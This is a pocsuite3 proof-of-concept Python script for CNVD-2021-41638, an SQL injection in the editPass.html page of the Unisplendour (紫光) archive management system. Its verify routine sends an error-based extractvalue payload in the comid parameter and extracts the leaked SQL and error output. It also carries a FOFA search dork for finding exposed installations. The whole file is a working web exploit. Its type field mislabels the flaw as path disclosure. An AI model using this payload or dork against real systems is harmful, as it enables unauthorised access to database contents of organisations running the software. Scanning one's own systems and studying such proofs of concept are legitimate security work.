import re, base64
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '13'  
    author = ['PeiQi']
    name = '紫光档案管理系统 editPass.html SQL注入漏洞 CNVD-2021-41638'
    desc = '''紫光软件系统有限公司（以下简称“紫光软件”）是中国领先的行业解决方案和IT服务提供商。
紫光电子档案管理系统存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。
    '''
    appName = '紫光档案管理系统'
    appVersion = '未知版本'
    fofa_dork = {'fofa': 'app="紫光档案管理系统"'} 
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if 'c4ca4238a0b923820dcc509a6f75849' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Sql'] = re.findall(r'<h1>errorSql=(.*)', resp.text)[0]
                result['VerifyInfo']['Result'] = re.findall(r'XPATH syntax error: (.*)', resp.text)[0]
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def _attack(self):
        result = {}

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)